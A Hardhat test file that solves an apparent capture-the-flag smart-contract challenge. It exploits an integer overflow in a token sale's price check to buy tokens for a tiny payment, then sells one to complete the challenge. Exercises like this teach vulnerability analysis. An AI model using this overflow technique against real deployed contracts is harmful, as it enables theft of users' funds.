import { SignerWithAddress } from '@nomiclabs/hardhat-ethers/signers';
import { expect } from 'chai';
import { Contract } from 'ethers';
import { ethers } from 'hardhat';
const { utils } = ethers;

describe('TokenSaleChallenge', () => {
  let target: Contract;
  let deployer: SignerWithAddress;
  let attacker: SignerWithAddress;

  before(async () => {
    [attacker, deployer] = await ethers.getSigners();

    target = await (
      await ethers.getContractFactory('TokenSaleChallenge', deployer)
    ).deploy(attacker.address, {
      value: utils.parseEther('1'),
    });

    await target.deployed();

    target = target.connect(attacker);
  });

  it('exploit', async () => {
    //We can use an integer overflow attack.
    //to buy more, we need to pass the require(msg.value == numTokens * PRICE_PER_TOKEN)

    //Getting Maxunint Value.
    const maxUint256 = BigInt("115792089237316195423570985008687907853269984665640564039458"); 
    //The above calculation will get us an overflow of this amount and we make it wei so we can get a lot of tokens.
    const wei = '415992086870360064';

    //Covert it to wei.
    const amountInWei = ethers.utils.parseUnits(wei, "wei");

    await target.buy(maxUint256, { value: amountInWei });

    await target.sell(1);
 
    expect(await target.isComplete()).to.equal(true);
  });
});
